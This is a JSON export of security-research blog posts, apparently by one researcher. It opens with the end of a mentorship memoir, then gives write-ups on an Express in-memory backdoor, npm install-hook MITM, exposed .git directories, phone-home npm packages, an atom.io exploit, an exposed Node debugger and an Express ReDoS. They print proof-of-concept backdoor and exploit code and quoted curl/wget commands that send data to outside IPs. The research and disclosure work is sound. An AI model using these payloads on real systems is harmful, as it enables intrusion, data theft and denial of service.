doing the same work I was doing for him and of course got caught and got a stern talking to. I never have forgot that discussion and to not take advantage of people for money.\nWhen I was 17 we turned off the BBS installed a 56k line (lol that‚Äôs slow) and turned the modems into an ISP with an uplink to Fargo, ND. The world wide web was now my playground and this opened up tons of things to learn, DNS, systems administration, networking, tcp/ip, proxy servers and every time we got hacked into the list grew for things I had to learn.\nShortly I left for college, got a job at our ISP‚Äôs upstream provider then through a series of acquisitions and 80 hour work weeks and shitty bosses I found my way to Symantec. (as a side note my boss to be Tim took a huge chance on me only after a 17 min phone interview, again we see a trend of believing that people can do it if you enable them). After 6 years there I decided to go out on my own and start my own consultancy with a friend.\nWhat happened next was a punch in the gut. While I stood in the MGM Grand parking lot in Vegas I got a phone call as I was leaving for the last day. On the other end of the line was somebody telling me they were the owners of the ISP my mentor had started (Jim had got additional investors a few years back to create a large rural wireless network, it‚Äôs really cool what you can do with really flat country and really tall grain elevators), but it wasn‚Äôt good news. He was calling because Jim had cancer and had little time to live. They knew they needed to transition the technical knowledge Jim had to their team but wasn‚Äôt sure how to do that, when they asked him who he trusted to do this, he said he trusted me. We had not talked for probably 7‚Äì8 years at that point but it didn‚Äôt matter he said that I would know how he did things and how to take care of things when he was gone. They became our first customer. That revenue was one of the only reasons we survived those early months as a business. That company sold and in it‚Äôs ashes it because ^lift, where I work today.\nI owe a hell of a lot of my career to my mentor. If I look back on that mentorship, I think of a few things made it successful.\nHe always believed I could do it and told me that, it was in every word and action.\nHe was patient with me, he pointed me in the right direction but he expected me to run there as hard as I could and I did. I listened to his instruction. (at the time I had NO idea it would have an impact or that he was even mentoring me)\nI‚Äôve always wanted to help others like Jim helped me, I can tell you two things about my experiences mentoring; I‚Äôve got a long way to go to be more patient and mentors learn just as much from mentees as they do from mentors.\nps fuck cancer. I miss you Jim.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/in-memory-backdoor-for-node-js-express-apps/",
  "title": "In Memory Backdoor for Node.js Express Apps",
  "description": "Fun backdoor experiment with node / express apps",
  "date": "March 2, 2017",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "backdoor",
  "content":"Earlier this week Zach Grace published an article on one way that you could backdoor a Node.js Express application without touching disk. This jogged my memory of something I posted in our team‚Äôs chat this last week but never wrote about; how I would in memory backdoor an express application. It‚Äôs a bit different than how Zach approached it so I thought it would be good to expand upon his post sharing the knowledge.\nMy ‚Äúvulnerable‚Äù proof of concept is below. It uses a fairly common pattern of putting routes in a separate file. The eval is for convenience of demonstration and isn‚Äôt a pattern we find frequently.\nServer (index.js)\nvar express = require(‚Äòexpress‚Äô) var routes = require(‚Äò./routes‚Äô); var app = express() app.use(‚Äò/‚Äô, routes); app.listen(3000, function () { console.log(‚ÄòExample app listening on port 3000!‚Äô) }) routes.js\nvar express = require(‚Äòexpress‚Äô); var router = express.Router(); router.route(‚Äò/‚Äô).get(function (req, res) { // Assume some sort of code execution here eval(req.query.code); console.log(‚Äòcompleted‚Äô); return res.send(‚Äò‚Äô); }) module.exports = router; Now if we try and exploit and backdoor this app the way that Zach approached the problem we can‚Äôt for one simple reason, app is not defined. Now this won‚Äôt always be the case, but it‚Äôs very common for express applications to specify their routes in another file making app unavailable. Even if you call app=express(), as the express variable is available you get a different instance of express, so no go there.\nWhat we do always, for sure, have access to are req (request) and res (response) but since we don‚Äôt know the names the developer used we‚Äôll have to use what is always there, arguments.\nThe approach I thought to take was to find a route in the existing routing table (my example only has 1 route so we assume that but we would have to add some logic to find the route we wanted to backdoor, or maybe backdoor all of them ;). Then we wrap that route with our logic and we‚Äôre done.\nNote: I‚Äôm sure with enough digging in the innards of req or res one could find a reference to app and perform the same attack that Zack mentioned.\nUpdate (3/3/17, 9:53am): That didn‚Äôt take long. Chris Foster pointed out that you can use arguments[0].app to get access to app consistently. Embarrassingly enough this is documented in the express docs.\nHere is how you would find that route and it‚Äôs handler (function) and save it for later.\nbd=arguments[0].route.stack[0].handle; // same as req.route.stack[0].handle; Then we want to replace the original handler with our function, but make sure we call the original.\narguments[0].route.stack[0].handle=function(req,res,next){ console.log(\u0026#39;0wned\u0026#39;); // exfiltrate things here bd(req,res,next) } The reality here is that if you can get server side JavaScript injection on a node.js application it‚Äôs likely game over. You just don‚Äôt have the sandbox like you have with a browser. You will find one way or another to exfiltrate data, gain access to other parts of the applications or simply gain control of the server as the user that is running the Node.js process.\nThere are runtime protections being explored for node but they are all still very early in development. See this paper from Microsoft Research\nMy take away here for all attackers is that context matters a lot for exploitation and be careful to not make assumptions about your execution environment when you are developing your payloads.\nFor more JavaScript internals read the ‚ÄúWhen This is really That‚Äù post by Jon Lamendola.\n"},{
  "section": "Blog",
  "slug": "/blog/compromising-node-js-apps-using-machine-in-the-middle/",
  "title": "Compromising Node.js apps using Machine-in-the-Middle",
  "description": "A look at how attackers can exploit machine-in-the-middle attacks to compromise Node.js apps",
  "date": "January 11, 2017",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Security",
  "tags": "security",
  "content":"Just before the New Years I published 140+ advisories on Node.js modules. I‚Äôve been researching ways to compromise developers \u0026amp; node.js applications without compromising the npm registry or their CDN.\nTo start, I looked for modules with install hooks that downloaded and executed or used resources from the internet over HTTP, an insecure medium that‚Äôs susceptible to interception and manipulation, also known as a machine-in-the-middle attack.\nWhat is Machine-In-The-Middle (MITM)?\nMachine-in-the-Middle is a type of attack in which the attacker is able to put themselves between two parties and intercept and influence the traffic between the two parties.\nNormal Traffic Flow\nMachine-in-the-Middle\nThis attack can affect the confidentiality, integrity, and availability of data you or your application is expecting. Explaining how an attacker might actually gain this kind of position in a network and exploit the flaw is beyond the scope of this post, but know that the only pre-requisite is that they are either on the same local network as you, or positioned somewhere upstream. A common scenario for an attack like this to be exploited would be working from a public network, like a coffee shop or library.\nThe example video above shows using bettercap to manipulate the files chromedriver is downloading during install. The end of the video shows the exploit running on a yarn install, to demonstrate that it is not isolated to npm.\nWhat to do as a module author?\nAs a module author or maintainer you want to always make sure that when you download resources from the Internet you do so over HTTPS and you don‚Äôt allow for invalid certs to be ignored.\nAdditionally you will want to use a hashing function like sha256 to verify that the content you downloaded is what you expected (i.e. the hash matches).\nYou will also want to be sure to host the hashes over HTTPS as well, and preferably on another host in the event that the host serving the file is compromised.\nFor example, the hashes for npm packages are downloaded via the package json data from the npm registry, but the tarball comes down from their CDN.\nDon‚Äôt take a URL you have configured at face value. I‚Äôve run into at least one instance where tarballs and hashes were downloaded from a https:// URL but the URL redirected to an insecure http:// endpoint completely compromising the download and hash verification process. For this reason, you should always attempt to download the file from the configured URL first and verify that it doesn‚Äôt pass through any insecure redirects. Once a request passes through an unencrypted connection, the entirety of the rest of the request sequence cannot be trusted.\nModule user?\nIf you are a module consumer, ultimately you need to be proactive in making sure that your applications aren‚Äôt vulnerable to exploits like this. When 140+ vulnerabilities were released in a single day, and it only takes one exploit to compromise your app, manually ensuring modules are updated in a timely manner is a lot of work and risk to take on.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/pillaging-distributed-version-control-5-years-later/",
  "title": "Pillaging Distributed Version Control 5 Years Later",
  "description": "A look at exposed version control metadata files 5 years after my original DEFCON talk",
  "date": "November 13, 2016",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "research",
  "content":"5 years ago at DEFCON 19 I gave a talked titled ‚ÄúPillaging DVCS repos for fun and profit.‚Äù The technique \u0026amp; tool I outlined in that talk has been very fruitful through out the years and plenty of security consultants have told me that this had helped them have breakthroughs during penetration tests. If it‚Äôs useful to us it‚Äôs also useful to attackers.\nThe basics of the vulnerability is that git/mercurial/bazar are all distributed version control systems and because of that if you have access to the .git / .hg / .bzr meta data directory you can recreate some or all of the source code tree. This is particularly useful for security assessments as it turns them from black box to white box, making source code available, or leaking keys, passwords or other private information that may be checked into the repository.\nThis year I revisited that research to see what might have changed and I was fairly surprised by the results.\nThe original results The original scan of the Alexa top million looked like this.\nGIT: 1498 repos HG: 312 repos BZR: 235 repos\nPossibly the most interesting part of this original research is that I found the source code to every product of a company. I‚Äôm under NDA to not discuss the story but suffice it to say it was worth the research.\nThe new results GIT: 10,357 HG: 445 BZR: 31 10,833 total (1.08 % of the Alexa Top Million)\nMy thought is the significant increase is directly tied to the raise in the popularity of git over the last 5 years. It‚Äôs unfortunate that these simple attacks continue to work. Maybe it‚Äôs time to improve the standard defaults of web servers out there to not serve dot files by default.\nHow to test yourself For GIT, HG (mercurial), or BZR (Bazar) you can use the following urls and what should be in the response (it might vary slightly) on your domains.\nGIT curl http://example.com/.git/HEAD\nref: refs/heads/deploy HG curl http://example.com/.hg/requires\nrevlogv1 store fncache dotencode BZR /.bzr/README\nThis is a Bazaar control directory. Do not change any files in this directory. See http://bazaar.canonical.com/ for more information about Bazaar. How to protect yourself The advice here is pretty simple, always block dot files (directories or files that start with a period). Since many configurations are different look up ‚Äúhow to block dot files‚Äù for your particular web server.\nInteresting findings dot files as a honeypot That file is there to fuck with people like you. A number of the sites responded that the presence of these files were there as a honeypot / red herring or possibly they were just saving face. I‚Äôve seen that before and then a week later the vulnerability is gone. I suppose it is a very cheap way to get a potential attacker to waste a little time and would make false positives on a number of scanners.\nDisclosing at scale Probably the hardest part of all of this was disclosing the issues to the offending sites. I‚Äôve always felt an ethical obligation to notify somebody when I find a vulnerability, but when you find 10k of them it suddenly becomes a rather large burden.\nI asked my twitter followers\nI went with the option of emailing security@domain, hopeful that it would get through to most of them with little cost or effort.\nIt‚Äôs interesting to me that most of my followers said that punting an email to security@ would be acceptable however most of them also thought that \u0026gt; 75% would bounce, but this post isn‚Äôt about the science behind twitter polls.\nThe final result? 74.82% failed to be delivered. A higher percentage than I would have expected or had hoped for.\nWe really need a universal API for discovery and disclosure. It‚Äôs quite frustrating and at the end of the day having security@domain, despite the problem with spam it‚Äôs a good fallback communication endpoint everyone should have setup.\nStandards like ISO/IEC 29147 exist as a great framework but only works if people implement it. Additionally HackerOne has a community curated resource for contacting security teams but none of the 10k domains I had to contact showed up in there.\nWe have a long way to go. Finding bugs at scale is a lot easier than disclosure at scale. It should be the other way around. Make sure your organization has a clearly defined process for ingress of security issues.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/what-are-the-bots-up-to-on-npm/",
  "title": "What Are the Bots Up to on npm?",
  "description": "What are the bots up to on npm?",
  "date": "November 8, 2016",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "research, npm",
  "content":"Last year (2015) I had a thought, ‚Äúwho else is downloading and running / testing random modules on npm.‚Äù Postulating that there might be bots, build systems or other researchers mass downloading and running modules from npm. I figured it might be an interesting vector to attack systems and gain a foothold for some org and I was curious to know what that traffic looked like.\nSo I set the bait. I built a module, called botbait. This module calls home when it‚Äôs installed, required, or tested as well as the following.\nvar payload = { process_versions: process.versions, process_platform: process.platform, process_arch: process.arch, type: process.argv[2] || ‚Äòindex.js‚Äô } The Results The results are pretty boring. I thought there would be a lot more random installations / tests to be honest.\nTotal Downloads ‚Äî 582\nWho took the bait?\nUnique Sources ‚Äî 7\nThe sources that stand out as interesting to me are the ones from Berkeley and Microsoft. I hope that somebody there has some interesting research to share.\nRaw data.\n2015-06-23T21:04:11.995Z, 193.137.5.49, ran npm test 2015-11-25T18:02:53.950Z, 140.78.145.161, npm i 2016-01-29T16:26:03.223Z, 89.251.52.64, npm i 2016-08-13T18:19:28.746Z, 131.107.160.43, ran or required index.js 2016-08-26T02:56:44.625Z, 103.6.32.2, npm i 2016-09-30T22:34:10.421Z, 192.31.105.138, ran or required index.js 2016-10-08T04:07:01.342Z, 192.31.105.136, ran or required index.js Who else is watching? During my late nights spelunking around the npm registry I found a few others that are calling home.\nI do not in any way recommend installing these modules. At the time of writing they were not malicious but you never know.\net_phone_home ‚Äî pings a url\nwget -q http://176.31.142.25/javascript_no_way_you_got_here_randomly anarchy ‚Äî Reports to google analytics UA-48351156‚Äì4\nharmlesspackage‚Äî reports your username via postinstall hook\ncurl -X GET http://104.131.21.155:8043/?$(whoami) \u0026hellip; I‚Äôm sure there are others that I didn‚Äôt notice this time around.\nFinal thoughts Something I thought would be fun to dig into really wasn‚Äôt. It‚Äôs not always a glorious result for research. There isn‚Äôt a lot of automated activity that‚Äôs just downloading all the modules and doing things. Most of the activity comes from registry replicas mirroring the registry.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/atom-io-misconfiguration-allowed-code-execution-on-untrusted-networks/",
  "title": "Atom.io Misconfiguration Allowed Code Execution on Untrusted Networks",
  "description": "",
  "date": "October 30, 2016",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Application, Data",
  "tags": "security",
  "content":" Developers have increasingly become a more valuable target to compromise in recent years. The DevOps movement means they have more access to production, not to mention the plethora of source code and keys that you are likely to find.\nThis post is going to show you how a production configuration mistake on the atom.io domain that put users of the Atom editor at risk.\nNote this issue is now fixed thanks to the GitHub Security team.\nBackground Atom\u0026rsquo;s package manager apm uses npm to fulfill it\u0026rsquo;s dependencies and for native modules this means using node-gyp when code needs to be compiled.\nAs part of the compilation step for native modules, node-gyp downloads a tarball for headers from a specified dist-url and a list of SHASUMS for integrity verification.\nThese urls are configured with a flag, something like this\nnode-gyp rebuild --dist-url=https://atom.io/download/atom-shell\nThis is where the subtle bug gets introduced. When auditing the source someone might look at this, confirm that HTTPS is being used and move on. They might even go a step further and curl the url and verify that it is in fact using HTTPS and you would be correct that it is.\nHowever‚Ä¶.\nThe dist-url and SHASUM url\u0026rsquo;s that are derived by node-gyp are forwarded to an S3 bucket over HTTP by the atom.io web service.\nFor example: When hxxps://atom.io/download/atom-shell/v0.30.6/node-v0.30.6.tar.gz is requested a 302 is returned with a redirect location of hxxp://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/dist/v0.30.6/node-v0.30.6.tar.gz\nThe same goes for the SHASUM url\nhxxps://atom.io/download/atom-shell/v0.30.6/SHASUMS256.txt redirects to hxxp://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/dist/v0.30.6/SHASUMS256.txt\nSo what?\nThat means if we can get between the developer and atom.io we can control the content returned for the dist tarball and the SHASUM file.\nBut before getting that far I had to figure out how to backdoor the dist tarball so that I could have code execution. Knowing nothing about how node-gyp works, and finding it to be a rats nest of gibberish this took a while. I\u0026rsquo;m sure there are other ways as well, such as causing a backdoor to be compiled into the final library. I went with what I felt was a simpler route, as attackers tend to do.\nThe Exploit What I found was that node-gyp loads a file namedcommon.gypi. This file provides ways to specify defaults and configuration for gyp. The proof of concept below includes a default target with an action to execute the say command, however this could be any command the attacker wants to run.\n\u0026#39;target_name\u0026#39;: \u0026#39;sdf\u0026#39;, \u0026#39;sources\u0026#39;: [\u0026#39;src/asdf.h\u0026#39;], \u0026#39;actions\u0026#39;: [{ \u0026#39;action_name\u0026#39;: \u0026#39;hax\u0026#39;, \u0026#39;inputs\u0026#39;: [\u0026#39;src/asdf.h\u0026#39;], \u0026#39;outputs\u0026#39;: [\u0026#39;\u0026lt;(PRODUCT_DIR)/asdf.out\u0026#39;], \u0026#39;action\u0026#39;: [\u0026#39;/usr/bin/say\u0026#39;, \u0026#39;ha ha ha ha ha ha powned\u0026#39;], }], Once I had reliable code execution during a node-gyp installation, I had to perform a MITM (machine in the middle) attack and swap out the tarball and the SHASUMS file.\nFor this task I used Bettercap, an extensible MITM framework with many already built plugins. Since what I had to do was a bit custom, I wrote a custom plugin to replace more than one file on the fly.\nMitigating Factors First of all, not all modules trigger this condition because there are plenty of modules that are not native modules.\nSecondly, node-gyp caches the dist content so if it\u0026rsquo;s already on disk it won\u0026rsquo;t be downloaded again.\nTimeline Fun Facts\n10.28.2016 ‚Äî Vulnerability found 10.29.2016 ‚Äî Confirmed exploitability 10.30.2016 ‚Äî Notified atom.io via email 10.31.2016 ‚Äî Notified AtomEditor via twitter 11.03.2016 ‚Äî Submitted to GitHub bounty via hackerone.com 11.03.2016 ‚Äî Received bug confirmation 11.05.2016 ‚Äî Verified fix was in place 11.07.2016 ‚Äî GithHub Security resolved the issue \u0026amp; issued a bounty Big thanks to the GitHub Security team for their quick response and good communication with the reported issue.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/brilliant-hire-exposure-no-bounty/",
  "title": "Brilliant Hire Exposure No Bounty",
  "description": "",
  "date": "October 30, 2016",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Application, Data",
  "tags": "security",
  "content":"\nDuring security research a few years back, I discovered an exposure on SAP\u0026rsquo;s BrilliantHire API - an exposed Node.js debugger instance that provided full remote code execution capabilities and access to sensitive AWS credentials, database encryption keys, and production source code. The finding highlights how a simple misconfiguration can lead to complete system compromise.\nThe Issue Node.js debuggers left exposed to the internet require no authentication and essentially provide \u0026ldquo;remote code execution as a service\u0026rdquo;. An attacker can simply:\nNavigate to chrome://inspect Click \u0026ldquo;Configure\u0026rdquo; Add the IP:port of the exposed debugger Get full access to the running process In this case, the debugger was accessible at http://35.166.232.40:9229/\nThe Impact Through the exposed debugger, I had access to:\n2 Production AWS credentials including access keys:\nAKIAJREDACTEDERICWXQ AKIAREDACTEDZMMLZGV5 These credentials had access to multiple S3 buckets including:\nbrillianthire-test brillianthire.fileuploads brillianthire.io brillianthire.logs dashboard.brillianthire.io transcript-backups And several others Database encryption keys (potentially dev environment):\nDatabase IV Database encryption key Database salt Full source code access\nInternal hostnames and infrastructure details\nThe Takeaway This type of exposure is particularly dangerous because:\nNode.js debuggers provide full RCE capabilities with no authentication The process runs with the same permissions as the application Environment variables containing sensitive credentials are exposed Source code can be extracted When running Node.js applications in production, always ensure debugger ports are not exposed to the internet. If debugging is needed, use SSH tunneling or VPN access rather than exposing the port directly.\nNote: All credentials shown have been rotated and are no longer valid. The debugger has since been taken offline.\n"},{
  "section": "Blog",
  "slug": "/blog/regular-expression-denial-of-service-affecting-express-js/",
  "title": "Regular Expression Denial of Service Affecting Express.js",
  "description": "A look at how attackers can exploit regular expression denial of service in Express.js",
  "date": "April 29, 2016",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "vulnerability, research, express",
  "content":"At the end of April I found a flaw in a module that Express and many other frameworks use. This flaw allows a remote attacker to block the event loop of a remote site causing a Denial of Service effectively blocking the site from being accessed. This type of attack is known as a Regular Expression Denial of Service attack and we‚Äôve found it to be quite common in applications and modules we test.\nexpress.js is the most popular web framework for node.js. It frequently gets over 5 million downloads a month and a quick search on shodan shows over 200k web servers online claiming to be powered by express, and that‚Äôs not even including those servers that don‚Äôt report their server version.\nThe identified flaw relies on the express app using a feature called acceptsLanguages() commonly used for determining the preferred language of the client based on the Accepts-Language header. A quick grep for the ‚ÄúacceptsLanguages‚Äù function call in your application will tell you if you are using it in any way. If you found it, chances are you‚Äôre vulnerable. Either way you should upgrade to Express 4.14 or greater.\nHere is a quick example of a vulnerable express application. I added 1 line to the express Hello World example.\nvar express = require(‚Äòexpress‚Äô); var app = express(); app.get(‚Äò/‚Äô, function (req, res) { **req.acceptsLanguages(‚Äòes‚Äô);** res.send(‚ÄòHello World!‚Äô); }); app.listen(3000, function () { console.log(‚ÄòExample app listening on port 3000!‚Äô); }); To attack this application and cause a denial of service we need to provide an Accept-Language header that is specially crafted to trigger the catastrophic condition with the regular expression parser.\nvar http = require(\u0026#39;http\u0026#39;); var req = http.request({ host: ‚Äòlocalhost‚Äô, port: 3000, headers: { \u0026#39;Accept-Language\u0026#39;: \u0026#39;a\u0026#39; + Array(60000).join(\u0026#39;-\u0026#39;) + \u0026#39;\u0026gt;\u0026#39; } }, (res) =\u0026gt; { }); req.end(); The flaw is due to a Regular Expression Denial of Service flaw in negotiator, the library that Express uses for this feature.\nIf you aren‚Äôt familiar with what ReDoS is, it is part of a class of attacks called algorithmic complexity attacks. Although that sounds highly technical and confusing, it‚Äôs simply a fancy way of saying that it is an input that causes an algorithm to run in the most inefficient way possible. In node.js, this is particularly impacting, as it blocks the event loop, so all processing, even asynchronous communications like file system access or networking will fail.\nReDoS generally occurs when an application uses a Regular Expression that either includes repetitive matching on a complex subexpression, or includes repetitive matching of a simple subexpression that also partially matches another subexpression.\nA handy tool to review a regular expression is safe-regex, but be warned it‚Äôs very false positive prone.\nOriginally posted on Medium\n"}]
